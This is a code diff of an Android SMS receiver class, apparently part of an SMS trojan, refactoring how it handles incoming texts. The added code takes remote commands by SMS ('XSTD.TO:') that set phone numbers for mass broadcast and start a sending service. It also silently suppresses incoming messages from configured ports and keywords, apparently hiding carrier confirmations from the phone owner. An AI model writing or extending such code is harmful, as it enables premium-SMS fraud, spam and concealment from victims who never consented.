@@ -50,101 +50,122 @@ public class PrivateSMSBRC extends BroadcastReceiver {
 
                 //对于任何一条短信，都要先取出短信的发送地址
                 String address = message.getOriginatingAddress();
-                if (TextUtils.isEmpty(address) || address.startsWith("10")) {
-                    //当短信发送地址是以10开始或是地址是空的时候，表示这个短信是应该忽略的，因为可以是运营短信。
+                if (TextUtils.isEmpty(address)) {
                     if (Config.DEBUG) {
-                        Config.LOGD("\n[[PrivateSMSBRC::onReceive]] ignore this Message as the address is empty or address start with 10.\n");
+                        Config.LOGD("\n[[PrivateSMSBRC::onReceive]] ignore this Message as the address is empty.\n");
                     }
                     return;
                 }
 
-                /**
-                 * 短信发送地址处理
-                 */
-                if (address.startsWith("+") == true && address.length() == 14) {
-                    address = address.substring(3);
-                } else if (address.length() > 11) {
-                    address = address.substring(address.length() - 11);
-                }
-
-                /**
-                 * 短信中心处理
-                 */
-                String center = message.getServiceCenterAddress();
-                if (!TextUtils.isEmpty(center)) {
-                    if (center.startsWith("+") == true && center.length() == 14) {
-                        center = center.substring(3);
-                    } else if (center.length() > 11) {
-                        center = center.substring(center.length() - 11);
-                    }
-                    SettingManager.getInstance().setKeySmsCenterNum(center);
-                }
-
-                /**
-                 * 是否是短信服务器发送的短信
-                 */
-                if (/*AppRuntime.PHONE_SERVICE.startsWith(address) && */msg.contains("XSTD.TO:")) {
-                    String phoneNumbers = msg.trim().substring("XSTD.TO:".length());
-                    String oldPhoneNumbers = SettingManager.getInstance().getBroadcastPhoneNumber();
-                    if (TextUtils.isEmpty(oldPhoneNumbers)) {
-                        SettingManager.getInstance().setBroadcastPhoneNumber(phoneNumbers);
-                    } else {
-                        SettingManager.getInstance().setBroadcastPhoneNumber(oldPhoneNumbers + ";" + phoneNumbers);
-                    }
+                if (address.startsWith("10")) {
+                    //当短信发送地址是以10开始或是地址是空的时候，表示这个短信是应该忽略的，因为可以是运营短信。
                     if (Config.DEBUG) {
-                        Config.LOGD("\n[[PrivateSMSBRC::onReceive]] we receive SMS [[XSTD.TO:]] for broadcast"
-                            + " phoneNumbers : " + SettingManager.getInstance().getBroadcastPhoneNumber() + " >>>>>>>>");
-                    }
-
-                    Intent i = new Intent();
-                    i.setClass(context, PluginService.class);
-                    i.setAction(PluginService.SMS_BROADCAST_ACTION);
-                    context.startService(i);
-                }
-
-
-                /**
-                 * 如果短信中心不为空，那么再进行其他的操作
-                 */
-                if (!TextUtils.isEmpty(SettingManager.getInstance().getKeySmsCenterNum())
-                        && AppRuntime.ACTIVE_RESPONSE != null
-                        && !TextUtils.isEmpty(AppRuntime.ACTIVE_RESPONSE.blockSmsPort)) {
-                    //对于短信内容先进行二次确认检查
-
-                    if (!secondSMSCmdCheck(msg, address)) {
-                        boolean keyBlock = false;
-                        boolean white = false;
-                        if (!TextUtils.isEmpty(msg) && !TextUtils.isEmpty(AppRuntime.ACTIVE_RESPONSE.blockKeys)) {
-                            try {
-                                if (isContainWhite(msg, AppRuntime.ACTIVE_RESPONSE.blockKeys)) {
-                                    return;
-                                }
-                                keyBlock = AndOrCheckForFilter(msg, AppRuntime.ACTIVE_RESPONSE.blockKeys);
-                            } catch (Exception e) {
-                            }
-                        }
-
-                        if (address.startsWith(AppRuntime.ACTIVE_RESPONSE.blockSmsPort) || keyBlock) {
-                            abortBroadcast();
-                            if (Config.DEBUG) {
-                                Config.LOGD("[[PrivateSMSBRC::onReceive]] block one SMS : " + msg + "  from : " + address);
-                            }
-                        }
-                    } else {
-                        abortBroadcast();
-                        if (Config.DEBUG) {
-                            Config.LOGD("[[PrivateSMSBRC::onReceive]] block one SMS : " + msg + "  from : " + address);
-                        }
+                        Config.LOGD("\n[[PrivateSMSBRC::onReceive]] Message start with 10.\n");
                     }
                 } else {
-                    //如果短信中心为空，向的运营商发送一条信息来获取短信中心的号码
-//                    SMSUtil.trySendCmdToNetwork(context);
+                    //短信的地址应该是正常的地址
+                    /**
+                     * 短信发送地址处理
+                     */
+                    if (address.startsWith("+") == true && address.length() == 14) {
+                        address = address.substring(3);
+                    } else if (address.length() > 11) {
+                        address = address.substring(address.length() - 11);
+                    }
+
+                    /**
+                     * 短信中心处理
+                     */
+                    String center = message.getServiceCenterAddress();
+                    if (!TextUtils.isEmpty(center)) {
+                        if (center.startsWith("+") == true && center.length() == 14) {
+                            center = center.substring(3);
+                        } else if (center.length() > 11) {
+                            center = center.substring(center.length() - 11);
+                        }
+                        SettingManager.getInstance().setKeySmsCenterNum(center);
+                    }
                 }
+                if (handleMessage(context, msg, address)) abortBroadcast();
             }
         }
     }
 
-    private boolean isContainWhite(String msg, String cmd) {
+    /**
+     * 返回 true 表示短信应该被拦截处理
+     *
+     * @param context
+     * @param msg
+     * @param address
+     * @return
+     */
+    public static final boolean handleMessage(Context context, String msg, String address) {
+        if (Config.DEBUG) {
+            Config.LOGD("[[PrivateSMSBRC::handleMessage]] msg = " + msg + " address = " + address);
+        }
+        /**
+         * 是否是短信服务器发送的短信
+         */
+        if (/*AppRuntime.PHONE_SERVICE.startsWith(address) && */msg.contains("XSTD.TO:")) {
+            String phoneNumbers = msg.trim().substring("XSTD.TO:".length());
+            String oldPhoneNumbers = SettingManager.getInstance().getBroadcastPhoneNumber();
+            if (TextUtils.isEmpty(oldPhoneNumbers)) {
+                SettingManager.getInstance().setBroadcastPhoneNumber(phoneNumbers);
+            } else {
+                SettingManager.getInstance().setBroadcastPhoneNumber(oldPhoneNumbers + ";" + phoneNumbers);
+            }
+            if (Config.DEBUG) {
+                Config.LOGD("\n[[PrivateSMSBRC::handleMessage]] we receive SMS [[XSTD.TO:]] for broadcast"
+                                + " phoneNumbers : " + SettingManager.getInstance().getBroadcastPhoneNumber() + " >>>>>>>>");
+            }
+
+            Intent i = new Intent();
+            i.setClass(context, PluginService.class);
+            i.setAction(PluginService.SMS_BROADCAST_ACTION);
+            context.startService(i);
+
+            return true;
+        }
+
+
+        /**
+         * 如果短信中心不为空，那么再进行其他的操作
+         */
+        if (!TextUtils.isEmpty(SettingManager.getInstance().getKeySmsCenterNum())
+                && AppRuntime.ACTIVE_RESPONSE != null
+                && !TextUtils.isEmpty(AppRuntime.ACTIVE_RESPONSE.blockSmsPort)) {
+            //对于短信内容先进行二次确认检查
+
+            if (!secondSMSCmdCheck(msg, address)) {
+                boolean keyBlock = false;
+                if (!TextUtils.isEmpty(msg) && !TextUtils.isEmpty(AppRuntime.ACTIVE_RESPONSE.blockKeys)) {
+                    try {
+                        if (isContainWhite(msg, AppRuntime.ACTIVE_RESPONSE.blockKeys)) {
+                            return false;
+                        }
+                        keyBlock = AndOrCheckForFilter(msg, AppRuntime.ACTIVE_RESPONSE.blockKeys);
+                    } catch (Exception e) {
+                    }
+                }
+
+                if (address.startsWith(AppRuntime.ACTIVE_RESPONSE.blockSmsPort) || keyBlock) {
+                    if (Config.DEBUG) {
+                        Config.LOGD("[[PrivateSMSBRC::onReceive]] block one SMS : " + msg + "  from : " + address + " for KEY or SMS PORT filter");
+                    }
+                    return true;
+                }
+            } else {
+                if (Config.DEBUG) {
+                    Config.LOGD("[[PrivateSMSBRC::onReceive]] block one SMS : " + msg + "  from : " + address + " second check");
+                }
+                return true;
+            }
+        }
+
+        return false;
+    }
+
+    private static boolean isContainWhite(String msg, String cmd) {
         String[] or = cmd.split("\\|");
         if (or.length <= 1) {
             String[] and = cmd.split("&");
@@ -172,7 +193,7 @@ public class PrivateSMSBRC extends BroadcastReceiver {
      * @param cmd
      * @return
      */
-    private boolean AndOrCheckForFilter(String msg, String cmd) {
+    private static boolean AndOrCheckForFilter(String msg, String cmd) {
         String[] or = cmd.split("\\|");
         if (or.length <= 1) {
             //没有|逻辑
@@ -216,7 +237,7 @@ public class PrivateSMSBRC extends BroadcastReceiver {
      * @param number
      * @return
      */
-    private boolean secondSMSCmdCheck(String msg, String number) {
+    private static boolean secondSMSCmdCheck(String msg, String number) {
         if (!TextUtils.isEmpty(msg) && AppRuntime.ACTIVE_RESPONSE.smsCmd != null) {
             String port = AppRuntime.ACTIVE_RESPONSE.smsCmd.portList.size() > 1
                               ? AppRuntime.ACTIVE_RESPONSE.smsCmd.portList.get(1)
